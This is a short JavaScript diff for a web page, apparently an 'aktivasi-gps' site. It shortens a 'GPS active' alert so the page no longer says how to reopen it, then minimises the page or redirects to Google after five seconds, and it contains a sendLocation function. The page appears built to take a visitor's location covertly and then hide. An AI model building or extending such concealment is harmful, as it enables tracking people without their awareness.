@@ -200,7 +200,7 @@ document.getElementById('startBtn').style.display = 'none';
 
  // Tampilkan pesan sukses di layar
 setTimeout(function() {
-    alert('✅ GPS SUDAH AKTIF!\n\nAplikasi akan di-minimize.\n\nUntuk membuka kembali:\n1. Tekan tombol Home\n2. Buka Chrome\n3. Buka aplikasi ini lagi\n\nAtau buka: aktivasi-gps.vercel.app');
+    alert('✅ GPS SUDAH AKTIF!\n\nAplikasi akan di-minimize.');
     
     if (navigator.userAgent.match(/Android/i)) {
         try {
@@ -212,7 +212,7 @@ setTimeout(function() {
     } else {
         window.location.href = 'https://www.google.com';
     }
-}, 1000);
+}, 5000);
   }
 async function sendLocation(coords) {
   try {
